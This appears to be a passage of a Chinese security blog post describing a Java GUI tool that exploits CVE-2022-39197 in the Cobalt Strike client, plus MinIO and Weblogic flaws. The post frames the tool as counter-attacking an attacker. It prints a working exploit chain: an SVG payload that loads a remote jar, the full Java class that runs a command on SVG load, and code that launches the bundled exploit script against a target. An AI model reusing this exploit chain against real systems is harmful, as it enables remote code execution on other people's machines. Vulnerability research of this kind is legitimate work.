+    textArea1.appendText(<span class="hljs-string">&quot;[示例] svg源码:\n&quot;</span>+
+                    <span class="hljs-string">&quot;&lt;svg xmlns=\&quot;http://www.w3.org/2000/svg\&quot; xmlns:xlink=\&quot;http://www.w3.org/1999/xlink\&quot; version=\&quot;1.0\&quot;&gt;\n&quot;</span> +
+                            <span class="hljs-string">&quot;&lt;script type=\&quot;application/java-archive\&quot; xlink:href=\&quot;http://127.0.0.1:9898/EvilJar-calc.jar\&quot;/&gt;\n&quot;</span> +
+                            <span class="hljs-string">&quot;&lt;text&gt;CVE-2022-39197&lt;/text&gt;\n&quot;</span> +
+                            <span class="hljs-string">&quot;&lt;/svg&gt;&quot;</span>+<span class="hljs-string">&quot;\n\n&quot;</span>+
+                    <span class="hljs-string">&quot;[示例] jar包里的恶意代码源码:弹出计算器,适用不同系统:macos/linux/windows,注意安装依赖,按需修改payload\n&quot;</span>+
+<span class="hljs-string">&quot;import org.w3c.dom.events.Event;\n&quot;</span> +
+        <span class="hljs-string">&quot;import org.w3c.dom.events.EventListener;\n&quot;</span> +
+        <span class="hljs-string">&quot;import org.w3c.dom.svg.EventListenerInitializer;\n&quot;</span> +
+        <span class="hljs-string">&quot;import org.w3c.dom.svg.SVGDocument;\n&quot;</span> +
+        <span class="hljs-string">&quot;import org.w3c.dom.svg.SVGSVGElement;\n&quot;</span> +
+        <span class="hljs-string">&quot;import java.util.*;\n&quot;</span> +
+        <span class="hljs-string">&quot;import java.io.*;\n&quot;</span> +
+        <span class="hljs-string">&quot;public class Exploit implements EventListenerInitializer &#123;\n&quot;</span> +
+        <span class="hljs-string">&quot;    public void initializeEventListeners(SVGDocument document) &#123;\n&quot;</span> +
+        <span class="hljs-string">&quot;        SVGSVGElement root = document.getRootElement();\n&quot;</span> +
+        <span class="hljs-string">&quot;        EventListener listener = new EventListener() &#123;\n&quot;</span> +
+        <span class="hljs-string">&quot;            public void handleEvent(Event event) &#123;\n&quot;</span> +
+        <span class="hljs-string">&quot;                try &#123;\n&quot;</span> +
+        <span class="hljs-string">&quot;                    String OS = System.getProperty(\&quot;os.name\&quot;, \&quot;unknown\&quot;).toLowerCase(Locale.ROOT);\n&quot;</span> +
+        <span class="hljs-string">&quot;                    if (OS.contains(\&quot;win\&quot;)) &#123;\n&quot;</span> +
+        <span class="hljs-string">&quot;                        Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);\n&quot;</span> +
+        <span class="hljs-string">&quot;                    &#125; else if (OS.contains(\&quot;mac\&quot;)) &#123;\n&quot;</span> +
+        <span class="hljs-string">&quot;                        Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);\n&quot;</span> +
+        <span class="hljs-string">&quot;                    &#125; else if (OS.contains(\&quot;nux\&quot;)) &#123;\n&quot;</span> +
+        <span class="hljs-string">&quot;                        Runtime.getRuntime().exec(\&quot;/usr/bin/mate-calc\&quot;);\n&quot;</span> +
+        <span class="hljs-string">&quot;                    &#125;\n&quot;</span> +
+        <span class="hljs-string">&quot;                &#125; catch (Exception e) &#123;&#125;\n&quot;</span> +
+        <span class="hljs-string">&quot;            &#125;\n&quot;</span> +
+        <span class="hljs-string">&quot;        &#125;;\n&quot;</span> +
+        <span class="hljs-string">&quot;        root.addEventListener(\&quot;SVGLoad\&quot;, listener, false);\n&quot;</span> +
+        <span class="hljs-string">&quot;    &#125;\n&quot;</span> +
+        <span class="hljs-string">&quot;&#125;\n\n&quot;</span>
+);</code></pre>
+<p>​
+2）用户提前准备好获取到的木马文件、目标主机能访问的SVG文件和实现远程代码执行功能的jar包。点击执行按钮设计如下功能：通过命令处的文本框接收用户输入的木马可执行文件绝对地址和SVG文件地址，点击执行按钮调用cs_rce类，Frida运行并注入可执行文件，修改进程列表里的该可执行文件名为包含用户输入的SVG文件地址的漏洞payload，Cobalt
+Strike客户端用户查看进程信息即触发访问SVG文件里设置的
+jar包，执行jar包设置的代码，实现反制。</p>
+<pre><code class="hljs java"><span class="hljs-comment">//button1：执行按钮,反制</span>
+button1.setOnAction(event2 -&gt; &#123;
+    payload=textArea2.getText();  <span class="hljs-comment">//接收命令</span>
+    <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;cs RCE&quot;</span>))&#123;
+        <span class="hljs-keyword">if</span> (payload== <span class="hljs-keyword">null</span>)&#123;
+            textArea1.appendText(<span class="hljs-string">&quot;[*]命令不能空！\ne.g:beacon.exe http://127.0.0.1:4444/evil.svg\n\n&quot;</span>);
+        &#125;
+        <span class="hljs-keyword">else</span>&#123;
+            d = <span class="hljs-keyword">new</span> Date();
+            time = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(d);
+            textArea1.appendText(<span class="hljs-string">&quot;[+]运行成功！&quot;</span> + time + <span class="hljs-string">&quot;自行查看结果：\n&quot;</span>);
+            textArea1.appendText(cs_rce.poc(payload));&#125;
+    &#125;
+&#125;);</code></pre>
+<p>​
+3）这里我将执行漏洞的代码封装在cs_rce类：通过读取并<strong>生成临时文件的方法</strong>调用项目resources目录下的cve_2022_39197.py文件，该文件关键利用代码在之前Cobalt
+Strike章节的漏洞原理里具体解释过。</p>
+<p>​
+(1)cs_rce类：从当前类所在的resources目录中获取名为cve_2022_39197.py的文件内容，然后将其写入到同名的文件中。具体实现是通过创建一个FileOutputStream对象来将输入流中的数据写入到同名文件中。在这个过程中，使用一个缓冲区来提高效率。</p>
+<pre><code class="hljs java">String filename = <span class="hljs-string">&quot;cve_2022_39197.py&quot;</span>;
+InputStream inputStream = cs_rce.class.getResourceAsStream(<span class="hljs-string">&quot;/&quot;</span>+filename);  <span class="hljs-comment">//&quot;/&quot;表示在classpath的根目录下查找</span>
+<span class="hljs-comment">//System.out.println(&quot;[+]&quot;+filePath+&quot;\n&quot;);</span>
+File file = <span class="hljs-keyword">new</span> File(filename);
+FileOutputStream outputStream = <span class="hljs-keyword">new</span> FileOutputStream(file);  <span class="hljs-comment">// 将inputStream写入到临时文件file中</span>
+<span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];
+<span class="hljs-keyword">int</span> len;
+<span class="hljs-keyword">while</span> ((len = inputStream.read(buffer)) != -<span class="hljs-number">1</span>) &#123;
+    outputStream.write(buffer, <span class="hljs-number">0</span>, len); &#125;</code></pre>
+<p>​
+(2)然后调用Java的Runtime类执行该Python文件，读取Python运行结果并追加输出到回显文本框：</p>
+<pre><code class="hljs java"><span class="hljs-comment">// 执行python脚本</span>
+<span class="hljs-comment">//String[] args = new String[]&#123;&quot;python3&quot;, file.getAbsolutePath()&#125;;</span>
+String s=<span class="hljs-string">&quot;python3 &quot;</span>+file.getAbsolutePath()+<span class="hljs-string">&quot; &quot;</span>+target;
+System.out.println(s);
+Process proc = Runtime.getRuntime().exec(s);<span class="hljs-comment">// 执行py文件</span>
+
+<span class="hljs-comment">//获取输入流</span>
+BufferedReader in = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(proc.getInputStream()));
+<span class="hljs-comment">//获取错误流</span>
+BufferedReader errorStreamReader = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(proc.getErrorStream()));
+
+String line = <span class="hljs-keyword">null</span>;
+String result=<span class="hljs-string">&quot;&quot;</span>;
+<span class="hljs-keyword">while</span> ((line = in.readLine()) != <span class="hljs-keyword">null</span>) &#123; <span class="hljs-comment">//读取输入流</span>
+    result =result+line+<span class="hljs-string">&quot;\n&quot;</span>;
+&#125;
+<span class="hljs-keyword">while</span> ((line = errorStreamReader.readLine()) != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">//读取错误流</span>
+    result =result+line+<span class="hljs-string">&quot;\n&quot;</span>;
+&#125;
+in.close();
+<span class="hljs-comment">//等待子进程退出</span>
+proc.waitFor();
+<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[+] 执行结果:\n&quot;</span>+result+<span class="hljs-string">&quot;\n&quot;</span>;</code></pre>
+<h4 id="实现效果-2">实现效果</h4>
+<p>工具测试结果：</p>
+<p>​
+1）选择该漏洞时回显界面会显示本地自查漏洞的方法，点击检测按钮回显文本框新增如何反制的方法，如图</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201645354.png" srcset="/img/loading.gif" alt=" GUI界面检测按钮功能" style="zoom:50%;"></p>
+<p>​ 2）输入本地木马地址，搭建的SVG地址，点击执行，对方Cobalt
+Strike客户端弹出计算器。如用户输入：<em>C:.exe http://
+10.211.55.6:9898/evil.svg</em>，效果如图</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201646695.png" srcset="/img/loading.gif" alt="实现反制运行计算器" style="zoom:50%;"></p>
+<p>​ 同时反制端开启的Web服务收到访问请求并获取到对方IP，如图</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201647798.png" srcset="/img/loading.gif" alt="Windows10开启的Web服务记录请求记录" style="zoom:50%;"></p>
+<h4 id="注意事项"><strong>注意事项🚩：</strong></h4>
+<p>​ 1）Java里调用HTTP
+POST访问时要加UA头模拟浏览器访问，而不是使用普通的Java代码来进行访问，普通的使用URLConnection访问项目会报错HTTP响应返回400。</p>
+<p>​
+2）调用Python文件的方法：使用Java中的InputStream来读取/resources目录下的文件，将文件读入内存，并将其写入到一个临时文件（file）中，然后本地执行该文件，而不能简单以文件完整路径的方式来指定文件位置，因为在打包后，文件位置发生了变化，如图</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201647937.png" srcset="/img/loading.gif" alt="jar包里调用的Python文件路径直接写绝对路径会报错" style="zoom:50%;"></p>
+<h2 id="总结与改进方向">4. 总结与改进方向</h2>
+<p>针对GUI工具对三种漏洞的检测结果分析：</p>
+<table>
+<colgroup>
+<col style="width: 13%">
+<col style="width: 28%">
+<col style="width: 28%">
+<col style="width: 28%">
+</colgroup>
+<thead>
+<tr class="header">
+<th><strong>漏洞类型</strong></th>
+<th><strong>测试结果</strong></th>
+<th><strong>不足之处</strong></th>
+<th><strong>优化方向</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>MinIO信息泄露漏洞</td>
+<td>能直观地检测网站是否存在漏洞，并利用漏洞获取敏感信息</td>
+<td>对漏洞利用只是直接的返回HTTP完整响应，需要人为筛选有用信息，且未实现RCE功能</td>
+<td>可通过关键词检索键值对关键信息展示，如账号密码，免去人工检。后续添加对RCE的检测</td>
+</tr>
+<tr class="even">
+<td>Weblogic未授权远程代码执行漏</td>
+<td>能通过检测和利用两方面实现对网站的漏洞验证和利用</td>
+<td>测试结果仅局限于成功利用漏洞向LDAP服务器发送请求，需要人为通过LDAP服务器访问记录判断是否存在漏洞以及漏洞利用结果</td>
+<td>漏洞检测可通过添加DNSlog
+API爬取访问记录判断漏洞是否存在；漏洞利用可通过集成JNDI注入工具实现LDAP服务器预处理，这样无需自行搭建LDAP服务器，优化使用</td>
+</tr>
+<tr class="odd">
+<td>Cobalt Strike远程代码执行漏洞</td>
+<td>能直接使用该工具和捕获的木马实现对攻击者的反制，获取对方信息</td>
+<td>用户需自行准备SVG文件和恶意jar包并搭建服务器</td>
+<td>工具提前本地生成所需文件并开启Web服务，方便直接使用，Java
+FX偶尔卡顿，还需改进性能，可以尝试多线程之类的</td>
+</tr>
+<tr class="even">
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>​ 相较于普遍采用的命令行界面Python实现漏洞利用工具，本文采用Java
+Swing框架实现GUI界面，提供图形化界面，使得用户可以更加直观地点击操作和控制漏洞测试过程，而不需要记忆和启动命令行输入复杂参数，优化使用体验。</p>
+<p>​
+不过，在常规日常渗透测试中，漏扫多为多目标，目前GUI界面仅实现了该三种新漏洞的<strong>单目标</strong>探测和利用，且通过输出的程序运行时间发现有些部分运行速度较慢（cs部分），下一步可优化程序效率：通过输出的程序运行时间，我们可以找到程序中耗时较长的部分，进而进行优化和改进，可以尝试采用多线程运行以提高利用效率。针对多目标，下一步可以研究文件导入功能以扩大目标检测范围，以及对应的，针对大范围扫描的结果导出功能模块集成到Swing
+GUI中有待进一步研究。</p>
+<h2 id="延伸参考">延伸参考</h2>
+<p>在构思漏洞利用工具的时候发现很多好的作品：</p>
+<p>1.<strong>pocsuite，命令行大批量漏扫工具那种，常见的，可以安装pocsuite库然后自定义设计的poc/exp集成进去成工具，还是可玩的，但是对毕设论文来说自己设计的就少了，不够</strong></p>
+<blockquote>
+<p>【如何打造自己的PoC框架-Pocsuite3-使用篇】：https://paper.seebug.org/904/</p>
+<p>【基于Pocsuite框架的XXXX Scan
+poc扫描器设计思路】：https://jerrychan807.gitbooks.io/my-python-cookbook/content/ji-yu-pocsuite-kuang-jia-de-oksec-scan-poc-sao-miao-qi-she-ji.html</p>
+<p>【基于pocshuite，web扫描器】：https://github.com/Cl0udG0d/SZhe_Scan</p>
+</blockquote>
+<pre><code class="hljs vim">简单常用命令：<span class="hljs-keyword">python</span> pocsuite.<span class="hljs-keyword">py</span> -r tests/poc_example.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://www.example.<span class="hljs-keyword">com</span>/ --verify
+
+-r 为poc路径，可以单个poc文件，也可以是poc文件夹，-<span class="hljs-keyword">u</span>为验证url，--verify为执行poc验证函数</code></pre>
+<p>2.其他可学习设计的优秀漏扫框架：</p>
+<blockquote>
+<p>https://github.com/jiangsir404/POC-S、https://github.com/binfed/POC-T</p>
+<p>【https://blog.csdn.net/Fly_hps/article/details/87932317，笔记学习1，2:https://www.freebuf.com/sectool/237840.html】</p>
+<p>超精简的POC扫描框架:https://github.com/ibey0nd/HScan</p>
+<p>简单py扫描文件:
+http://www.qb5200.com/article/473543.html、https://cn-sec.com/archives/1275647.html</p>
+</blockquote>
+<p>3.参考</p>
+<blockquote>
+<p>【JAVA-GUI工具的编写】</p>
+<p>https://mp.weixin.qq.com/s/mCQ-rfFP1RN9iaC6bieOiw</p>
+<p>【收集poc的，固定模版，json格式】</p>
+<p>https://github.com/CVEProject/cvelist/blob/master/2023/28xxx/CVE-2023-28432.json</p>
+<p>【一款漏洞验证框架的构思】</p>
+<p>https://xz.aliyun.com/t/6161</p>
+<p>【Frida hook零基础教程】</p>
+<p>https://juejin.cn/post/7139854934928785439</p>
+<p>【python模块学习】</p>
+<p>https://www.huweihuang.com/python-notes/package/package-module.html</p>
+<p>【如何用Java程序运行python文件】</p>
+<p>https://blog.csdn.net/H17Q0818/article/details/105889536</p>
+<p>https://www.yisu.com/zixun/352389.html</p>
+<p>[1]吕校春,李玲莉.基于Swing的Java
+GUI组件开发[J].机械工程师,2008,No.203(05):129-131.</p>
+<p>[1]刘晓峥.浅析Java
+GUI编程工具集[J].科技信息,2012,No.427(35):596-597.</p>
+</blockquote>
+<h2 id="报错及解决">报错及解决</h2>
+<p>1.写代码运行时403报错，解决：https://blog.csdn.net/xc9711/article/details/124047530</p>
+<pre><code class="hljs less"><span class="hljs-selector-tag">conn</span><span class="hljs-selector-class">.setRequestProperty</span>(<span class="hljs-string">&quot;User-Agent&quot;</span>, <span class="hljs-string">&quot;Mozilla/4.76&quot;</span>);</code></pre>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304202258366.png" srcset="/img/loading.gif" alt="报错案例"></p>
+<p>2.Java调用Python文件失败，找不到文件，卡了很久。。</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304230246193.png" srcset="/img/loading.gif" alt="报错2" style="zoom:50%;"></p>
+<blockquote>
+<p>https://blog.csdn.net/u013514928/article/details/79360870</p>
+<p>https://blog.csdn.net/weixin_43165220/article/details/104014973</p>
+<p>https://blog.csdn.net/w1014074794/article/details/123951413</p>
+</blockquote>
+<p>​
+原因：使用Java中的InputStream来读取/resources目录下的文件,将文件读入内存，并将其写入到一个临时文件（file）中，然后执行python脚本，不能以文件完整路径的方式来指定文件位置，<strong><u>因为在打包后，文件位置可能发生了变化。</u></strong></p>
+<p>​ 选择直接写入新文件后运行成功：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304231647016.png" srcset="/img/loading.gif" alt="报错解决" style="zoom:50%;"></p>
+<p>3.weblogic
+poc运行失败的话应该是依赖问题：工具需导入配置文件wlfullclient.jar，具体操作见之前的漏洞分析文章</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E5%B7%A5%E5%85%B7%E8%AE%BE%E8%AE%A1/">漏洞分析,工具设计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">博客文章采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处，有疑问欢迎联系:)</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/17/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0minio/">
+                        <span class="hidden-mobile">MinIO verify 接口信息泄露-RCE分析(CVE-2023-28432)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/Romanc9" target="_blank" rel="nofollow noopener"><span>Luoman</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
